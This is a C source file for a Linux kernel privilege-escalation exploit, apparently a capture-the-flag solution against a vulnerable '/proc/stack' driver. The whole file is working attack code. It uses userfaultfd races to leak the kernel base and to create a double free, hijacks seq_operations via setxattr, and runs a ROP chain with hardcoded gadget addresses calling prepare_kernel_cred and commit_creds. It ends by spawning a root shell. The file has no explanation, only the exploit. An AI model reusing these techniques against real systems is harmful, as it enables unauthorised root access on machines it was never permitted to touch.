#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/xattr.h>
#include <stdio.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/sem.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <semaphore.h>

#include "kernelpwn.h"

int             dev_fd;
size_t          seq_fd;
size_t          seq_fd_reserve[0x100];
static char     *page = NULL;
static size_t   page_size, prepare_kernel_cred, commit_creds;

void push(void *data)
{
    if (ioctl(dev_fd, 0x57AC0001, data) < 0) {
        err_exit("push!");
    }
}

void pop(void *data)
{
    if (ioctl(dev_fd, 0x57AC0002, data) < 0) {
        err_exit("pop!");
    }
}

static void* leak_thread(void *arg)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;

    for (;;) 
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
            err_exit("poll");

        nread = read(uffd, &msg, sizeof(msg));

        if (nread == 0)
            err_exit("EOF on userfaultfd!\n");

        if (nread == -1)
            err_exit("read");

        if (msg.event != UFFD_EVENT_PAGEFAULT)
            err_exit("Unexpected event on userfaultfd\n");

        puts("[*] push trapped in userfaultfd.");
        pop(&kernel_offset);
        printf("[*] leak ptr: %lx\n", kernel_offset);
        kernel_offset -= 0xffffffff81c37bc0;
        kernel_base += kernel_offset;

        uffdio_copy.src = (unsigned long) page;
        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                              ~(page_size - 1);
        uffdio_copy.len = page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            err_exit("ioctl-UFFDIO_COPY");

        return NULL;
    }
}

static void* double_free_thread(void *arg)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;

    for (;;) 
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
            err_exit("poll");

        nread = read(uffd, &msg, sizeof(msg));

        if (nread == 0)
            err_exit("EOF on userfaultfd!\n");

        if (nread == -1)
            err_exit("read");

        if (msg.event != UFFD_EVENT_PAGEFAULT)
            err_exit("Unexpected event on userfaultfd\n");

        puts("[*] pop trapped in userfaultfd.");
        puts("[*] construct the double free...");
        pop(page);

        uffdio_copy.src = (unsigned long) page;
        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                              ~(page_size - 1);
        uffdio_copy.len = page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            err_exit("ioctl-UFFDIO_COPY");

        return NULL;
    }
}

size_t  pop_rdi_ret = 0xffffffff81034505;
size_t  xchg_rax_rdi_ret = 0xffffffff81d8df6d;
size_t  mov_rdi_rax_pop_rbp_ret = 0xffffffff8121f89a;
size_t  swapgs_restore_regs_and_return_to_usermode = 0xffffffff81600a34;
long    flag_fd;
char    flag_buf[0x100];

static void* hijack_thread(void *arg)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;

    for (;;) 
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
            err_exit("poll");

        nread = read(uffd, &msg, sizeof(msg));

        if (nread == 0)
            err_exit("EOF on userfaultfd!\n");

        if (nread == -1)
            err_exit("read");

        if (msg.event != UFFD_EVENT_PAGEFAULT)
            err_exit("Unexpected event on userfaultfd\n");

        puts("[*] setxattr trapped in userfaultfd.");
        puts("[*] trigger now...");

        for (int i = 0; i < 100; i++)
            close(seq_fd_reserve[i]);

        // trigger
        pop_rdi_ret += kernel_offset;
        xchg_rax_rdi_ret += kernel_offset;
        mov_rdi_rax_pop_rbp_ret += kernel_offset;
        prepare_kernel_cred = 0xffffffff81069e00 + kernel_offset;
        commit_creds = 0xffffffff81069c10 + kernel_offset;
        swapgs_restore_regs_and_return_to_usermode += kernel_offset + 0x10;
        printf("[*] gadget: %lx\n", swapgs_restore_regs_and_return_to_usermode);
        __asm__ volatile (
            "mov r15,   0xbeefdead;"
            "mov r14,   0x11111111;"
            "mov r13,   pop_rdi_ret;"
            "mov r12,   0;"
            "mov rbp,   prepare_kernel_cred;"
            "mov rbx,   mov_rdi_rax_pop_rbp_ret;"    
            "mov r11,   0x66666666;"
            "mov r10,   commit_creds;"
            "mov r9,    swapgs_restore_regs_and_return_to_usermode;"
            "mov r8,    0x99999999;"
            "xor rax,   rax;"
            "mov rcx,   0xaaaaaaaa;"
            "mov rdx,   8;"
            "mov rsi,   rsp;"
            "mov rdi,   seq_fd;"
            "syscall"
        );
        puts("[+] back to userland successfully!");
        printf("[+] uid: %d gid: %d\n", getuid(), getgid());
        puts("[*] execve root shell now...");
        system("/bin/sh");

        uffdio_copy.src = (unsigned long) page;
        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                              ~(page_size - 1);
        uffdio_copy.len = page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            err_exit("ioctl-UFFDIO_COPY");

        return NULL;
    }
}

int main(int argc, char **argv, char **envp)
{
    size_t      data[0x10];
    char        *uffd_buf_leak;
    char        *uffd_buf_uaf;
    char        *uffd_buf_hack;
    int         pipe_fd[2];
    int         shm_id;
    char        *shm_addr;
    pthread_t    t1, t2, t3;

    dev_fd = open("/proc/stack", O_RDONLY);

    page = malloc(0x1000);
    page_size = sysconf(_SC_PAGE_SIZE);

    // reserve object to protect freelist
    for (int i = 0; i < 100; i++) {
        if ((seq_fd_reserve[i] = open("/proc/self/stat", O_RDONLY)) < 0) {
            err_exit("seq reserve!");
        }
    }

    // create uffd thread for leak
    uffd_buf_leak = (char*) mmap(NULL, page_size, PROT_READ | PROT_WRITE, 
                                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    register_userfaultfd(&t1, uffd_buf_leak, page_size, leak_thread);

    // left dirty data in kmalloc-32
    shm_id = shmget(114514, 0x1000, SHM_R | SHM_W | IPC_CREAT);
    if (shm_id < 0) {
        err_exit("shmget!");
    }

    shm_addr = shmat(shm_id, NULL, 0);
    if (shm_addr < 0) {
        err_exit("shmat!");
    }

    if(shmdt(shm_addr) < 0) {
        err_exit("shmdt!");
    }

    // leak kernel base    
    push(uffd_buf_leak);
    printf("[+] kernel offset: %lx\n", kernel_offset);
    printf("[+] kernel base: %lx\n", kernel_base);

    // create uffd thread for double free
    uffd_buf_uaf = (char*) mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    register_userfaultfd(&t2, uffd_buf_uaf, page_size, double_free_thread);

    // construct the double free
    push("arttnba3");
    pop(uffd_buf_uaf);

    // create uffd thread for hijack
    uffd_buf_hack = (char*) mmap(NULL, page_size * 2, PROT_READ | PROT_WRITE,
                                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    register_userfaultfd(&t3, uffd_buf_hack+page_size, page_size,hijack_thread);
    printf("[*] gadget: %lx\n", 0xffffffff814d51c0 + kernel_offset);
    // add rsp , 0x1c8 ;pop rbx ;pop r12 ;pop r13 ;pop r14;pop r15 ;pop rbp;ret
    *(size_t *)(uffd_buf_hack + page_size - 8) = \
                                             0xffffffff814d51c0 + kernel_offset;

    // userfaultfd + setxattr to hijack the seq_ops->stat,trigger in uffd thread
    seq_fd = open("/proc/self/stat", O_RDONLY);
    setxattr("/exp", "arttnba3", uffd_buf_hack + page_size - 8, 32, 0);
}